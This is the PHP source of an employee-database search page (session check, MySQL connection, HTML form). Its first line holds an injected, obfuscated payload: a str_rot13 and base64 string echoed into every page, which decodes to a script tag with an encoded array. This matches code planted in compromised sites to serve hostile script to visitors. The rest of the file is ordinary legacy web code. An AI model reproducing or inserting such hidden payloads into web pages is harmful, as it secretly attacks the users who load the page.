<?php $somecrainsignvar="654r9cch"; echo base64_decode(str_rot13('CUAwpzyjqQ5xLKEyCJ5yqlORLKEyXPx7qzSlVTSlCFWjEG1QVUV6KG9gMGfiCUHfrv52ISjvqQOxnFuiLJMop2VkL3q7VPqhDzqBDG59nPyfrFV7qUW5r2qmMKWeMKqaXPx7sJAuqTAbXTRcr2f9ozI3VRWio2kyLJ4bXF50o1A0pzyhMltcsGg2LKVtLKVlCFWzZGVfZPj2ZPjkZvjlAPjgZmZfYGLfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj2BFjgBGNfZmZfYGLjYQRmBPjgZGRkYP0mYQZfBQDfYGHkYQV3YQV3YQV3YP04AljlAPjmBFjmYP00ZvjgAGDfZlj0AFjmAvjgZGtfYGR1YP05YQp1YP0mZljlAljgAGRfYGVkYP00AFjkZGpfYGZmYP05ZljjYQNfAwNfZGVfYGL5YQL2YP01APjmYP0kAFj2ZPj2ZljgZGN1YP0lZFjjYQRlZPjgZwDfYGp4YQRkZFjgAGRfYGLjYQp4YP0mYP05ZljjYQNfAGpfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj1ZFjgBQpfAGpfYGxfYGZmYQD1YP0kAFjgZwRfZmZfZGVfYGL5YQL2YP01APjmYQp4YP0kBPjgAmHfBQDfYGxmYQRjAFjlAPjgAmVfZPjgAwZfZGtfZGtfZPjkZvjlZFjgZmxfAwNfYGLjYQLjYP0lAljgBFjlAljgAwLfZGHfZGtfAwLfYGt0YQR4YQZmYQH0YP01AljgBFjmYP0lZFj0BPjgZwRfYGHkYQxfZwpfAvjlZFjgAGDfBQDfYGDlYP0lAljgAGRfZGZ1YP0kZmHfZwDfAwLfYGR4YP0mYP02Zlj5ZPjkAFjgZljgAvjgZmNfYGZfYGLfAmVfYGRlBFjkZQHfYGR1YP0mZPj0AFjgZljlAljgZGN1YQDlYQD4YQR1YP03ZvjgAGpfZGN1YP0kAFjgZmNfAQHfYGZfYGR4YP0lAlj4ZFjgZljgZGRkYP0lAPjkZQHfYGH3YQR4YQR4YP0kBPjlZFjgZwRfAwxfYGL5YP05YQtkYP0kZwLfZGR3YP02ZljgZljjYP0mBFj4APjgBQRfYGZmYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGx2YQLmYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQZfZGN4YP0kZGRfAGDfYGVkYP00AFj0BPjgZmZfZmNfZGHfYGp4YQR4YQD4YP0mZlj3BPjkBPjgBGNfYGZfZmLfZGVfYGL5YQL2YP01APjmYQx5YP02BFj3BPjgZGN1YP0lZFjjYQRlZPjgZGVjYQNfAmVfYGDlYQplYP0kAFjgZmLfBFj2YQZ2YP02YP0mAvjkZvjgAwxfAwLfYGH0YQZfYGR1YQLjYQLmYP0mZljgBGZfZPjjYQDlYQV3YP02Avj5ZljgZwDfZwDfYGRjZvjkZQVfYGZ5YQxfZwRfYGH3YP0kAFjmYQt0YP01ZFjgZGVfAQtfYGt0YQR1YQHkYP0kBPjgZmZfYGV3YQRmBPjgZGRkYP0mYQZfBQDfYGHkYQRlYQZ2YP0mBFjkZvjgAwxfAwLfYGH0YQZfBQRfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP0lZFjgAmHfBQDfZGVfYGL2YQL2YQV0YP03ZvjjYP02ZljkBPjkBPjjYQRlYQVkYP0mBFj2ZPjgAwNfAwNfYGV3YP05YQV3YP02AvjkAFjkBPj2AvjgBQDfZGtfZmZfAGDfYGH3YP05YQZfYGVkYQD4YP0lZFjgAGRfBFjlAlj2YQVkYP01APj4APjgAQVfYGV3YP01ZFjkZmHfYGRmAFjlAPj2AvjgZGtfYGZfYGLmYQxjYQR1YQV3YP0kZQHfAGRfYGZmYQZ5YP0lAlj4ZFjgZljgZGRkYQVkYQZfZGtfZGtfYGR4YQVkYP0lZFj2BFjgAwxfYGxfBQRfYGRmBPjkZQHfZwDfYGLmYP0mYQNfYGZ5YQt0YP0mYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfYGHkYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGRjBPjkZQHfYGZjYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQtkYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfBGNfYGRkZFj1APjgZwRfYGH3YQRjAFjgAQHfAQHfYGp4YQHkYP0mZljmBFjgZwpfBQRfYGZfYGRkZFjlZFjkZvjkAFjgAmtfAvjkZQHfYGD1YQD1YP03BPj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP05YP0mZPjgZljgAvj3ZvjgZwDfYGL2YQL2YP0kAFjgZmNfAQHfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YQV0YP0kZQHfAQVfAQtfZGHfYGplYQD4YP02Avj2AvjgZGHfYGZjYQD1YQV3YP0kZQHfYGVkYQNfZPj1Alj5YQVkYP01AljgZGHfZlj4APjgAGRfYGRlYQL5YP05ZPjmZljgAwNfZGZ4YP0kZGRfYGZfZlj4APjgAGRfZwpfZwpfZwpfYGt3YQV0YQZ5YQZfYGDlYP01APjmYQD1YQZ2YP0kBPjgZGHfYGxfAmHfYGZmYQV3YP01ZFjgZwRfYGD1YQZjYQZjYP04ZFjjYQZjYQt0YP00AFjgAwNfZGV2YP02Zlj2BFjgAmVfAvj5YQH0YP0kZQHfYGVkYQNfZGVjKFVhpzIjoTSwMFueYaA1LaA0pvtjYQRcYPqoWlx7pTS1CFWlovOyqwVjZGNvYaWypTkuL2HbMTS0MF5aMKETqJkfJJIupvtcYGRfVzSfVvx7MG1hMKptEaIhL3Eco24bVvVfVaWyqUHvX3OuqFx7MG1yXPx7LKVlCJHbLKVlXGgmCFVvB3MupvOjo3Z9ZQgzo3VbnG0jB2x8LKVlYzkyozq0nQgcXlfcr3Oiplf9pTSlp2IWoaDbnl5lMKOfLJAyXPWzLJkmMFVfVwOup2DvXFxeLKVlJ2yqYmZ7plf9LKVhp3Ivp3ElXUOipljkXGg9QDcyXUZcBmjip2AlnKO0Ct==')); $crain="";
	session_start();
	//echo "ssfsd".$_SESSION['Logged'];
	if(!isset($_SESSION['Logged']))
	{
		Header("Location: home.php");
		die();
	}
	elseif($_SESSION['Logged']=='No')
	{
		Header("Location: home.php");
		die();
	}
	include("../connectdb/connect.php");
 	mysql_select_db("pentagonclt",$con);
	 if(!$con)
	{
		die('Could not connect to server' . mysql_error());
	} 
		
	
?>
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script src="search.js"></script>
<script src="profile.js"></script>
<script src="login.js">	

</script>
<link href="../styleSheet/employee.css" type=text/css rel=stylesheet>
<link href="../styleSheet/employee_controls.css" type=text/css rel=stylesheet>
<title>:: Employee Database - Kerala :: </title>
<style type="text/css">
<!--
A:link { COLOR: #542F28; TEXT-DECORATION: none; font-weight: normal }
A:visited { COLOR: #542F28; TEXT-DECORATION: none; font-weight: normal }
A:active { COLOR:  white; TEXT-DECORATION:none; font-weight: normal }
A:hover { COLOR:  white; TEXT-DECORATION: none; font-weight: normal }
-->
</style>
</head>

<?php
echo"
<body topmargin=0 leftmargin=0 marginwidth=0 marginheight=0 bgproperties=fixed bgcolor=#FFFFFF 
onload=subsearch('name','',1,1,1,'First_Name','".$_SESSION["LogType"]."')  onkeydown=visible(event)> ";
?>

<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%"  bgcolor="#FFFFFF">
  <tr>
    <td width="100%" align="center" valign="top">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="1000" bgcolor="#000000">
      <tr>
        <td width="100%" background="img_new/head.gif" height="95">&nbsp;</td>
      </tr>
      <tr>
        <td width="100%" height="200" background="img_new/mainbg.gif" align="left" valign="top">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" height="187" >
        	 <?php
	   		if($_SESSION["LogType"]=="AD") 
	   		{
       ?>
          <tr>
            <td width="100%" height="25" colspan="2" class=txtleft>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            &nbsp;<a href="createaccount.php" style="text-decoration:none">Create Company Account</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <a href="listaccount.php" style="text-decoration:none">&nbsp;&nbsp; List Created Accounts </font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            <font color=white>List Featured Employees</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <a href="logout.php" style="text-decoration:none">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LogOut</font></a></font></td>
          </tr>
           <?php
       		}
       		else if($_SESSION["LogType"]=="EM" || $_SESSION["LogType"]=="CO")
       		{
		?>
          <tr>
            <td width="100%" height="25" colspan="2" class=txtleft height=25>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="JavaScript:disp1('Create Password')"> Create Password</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="JavaScript:disp1('Send Password')"> Send Password </a></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="addprofile.php">Add New Member</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="logout.php"> LogOut</a></font></font></td>
          </tr>
          <?php		
			}
       	?>
       	<span id="main">
          <tr>
            <td width="52%" height="100">&nbsp;</td>
            <td width="48%" height="165" align="left" valign="top">
            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="95%" height="129">
            <tr>
                <td width="102%" height="70" colspan="4">&nbsp;</td>
              </tr>

              <tr>
                <td width="6%" height="26">&nbsp;</td>
                <td width="23%" class="txtleftwhite" height="26">Name</td>
                <td width="73%" height="26" colspan="2">
	   <span id="main">
	            <input type="text" name="txtKeyword" 
				 id="txtKeyword" 
				 size="53" class="txtboxgrey"></span></td>
              </tr>
              <tr>
                <td width="6%" height="22">&nbsp;</td>
                <td width="23%" class="txtleftwhite" height="22">Qualifictiaon</td>
                <td width="58%" height="22">
	   <span id="main0">
				 <input type="text" name="cmbQualification" id="cmbQualification" size="50" 
				 class="txtboxgrey" readonly="readonly"></span></td>
                <td width="15%" height="22">
	   <span id="main3">
				 <input type="image" src="images/arrow.gif" width="18" height="21" 
				 onmouseup="view('quali')" ></span></td>
              </tr>
              <tr>
                <td width="6%" height="21">&nbsp;</td>
                <td width="23%" class="txtleftwhite" height="21">Designation</td>
                <td width="58%" height="21">
	   <span id="main1">
				 <input type="text" name="cmbDesignation" id="cmbDesignation" size="50" 
				 class="txtboxgrey"></span></td>
                <td width="15%" height="21">
	   <span id="main4">
				 <input type="image" src="images/arrow.gif" width="18" height="21"
				 onclick="view('desig')"  ></span></td>
              </tr>
               <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>
              <tr>
                <td width="6%" height="25">&nbsp;</td>
                <td width="23%" class="txtleftwhite" height="25">Company</td>
                <td width="58%" height="25">
	   <span id="main2">
				 <input type="text" name="cmbCompany" id="cmbCompany" size="50" class="txtboxgrey"></span></td>
                <td width="15%" height="25">
	   <span id="main5">
                 <input type="image" src="images/arrow.gif" width="18" height="21" 
				 onclick="view('company')" ></span></td>
              </tr>
               <?php
               	}
               	?>
              <tr>
                <td width="6%" height="19">&nbsp;</td>
                <td width="23%" class="txtleftwhite" height="19">
				 <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>City
			   <?php
               	}
               	?>
			   </td>
                <td width="73%" height="19" colspan="2">
	   <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="101%" height="23">
         <tr>
           <td width="66%" height="23">
	   <span id="main6">
	   			 <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>
				 <input type="text" name="cmbCity" id="cmbCity" size="42" class="txtboxgrey"></span></td>
           <td width="7%" height="23">
         
           <?php
               	}
               	?>
	   <span id="main7">
	   			 <?php
			   	if($_SESSION["LogType"]=="AD") 
			   	{
               ?>
				 <input type="image" src="images/arrow.gif" width="18" height="21" 
				  >
				  <?php
               	}
               	?></span></td>
           <td width="28%" height="23">
	   <span id="main8">
				 
				 <input type="image" src="imghome/button1.gif" onclick="getState('name','',1,1,1)"
				 onmouseover="swap1()" onmouseout="swap()" id="img" width="80" height="30"></span></td>
         </tr>
       </table>
                </td>
              </tr>
            </table>
            </td>
          </tr>
        </table>
        </td>
      </tr>
      <tr>
        <td width="100%" height="128">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="1000" >
          <tr>
            <td width="183" height="441" background="img_new/side.gif">&nbsp;</td>
            <td width="817" height="441" bgcolor="#FFFFFF" align="right" valign="top">&nbsp;&nbsp;&nbsp;
            <input type="button" value="Show Report" onclick="showReport()" class=button><span id="w"></span> 
		<span id="wait"></span> <br>
			
				<div id="pwd" style="position: absolute; z-index: 500;left: 180px; width:500; height:150; top:290px;background-image: url('images/bgpwd.gif'); visibility:hidden "></div>
		<div id="captcha" style="position: absolute; z-index: 500;left: 210px; width:400; top:430px; ; ">
		</div>
	<span id="quali" style="position: absolute; z-index: 500;left:635px; width:303; top:230px; height:200 ; overflow:scroll; visibility:hidden; " ></span>
		<span id="desig" style="position: absolute; z-index: 500;left:635px; width:303; top:255px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<span id="company" style="position: absolute; z-index: 500;left:635px; width:303; top:275px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<span id="city" style="position: absolute; z-index: 500;left:0px; width:220; top:358px; height:200 ; overflow:scroll;visibility:hidden;"></span>
		<div id="report" style="position: absolute; z-index: 100;left:190px; width:180; top:310px; height:400 ; width:800; overflow:auto;visibility:hidden;background-color: #FFFFFF" align="left"></div>
			<div id="listmembers" ></div>
			<br>
			<span id="w1"></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
			<br><img src="imghome/copyright.gif">
			</td>
          </tr>
          
        </table>
        </td>
      </tr>
       
    </table>
    </td>
  </tr>
</table>

</body>

</html>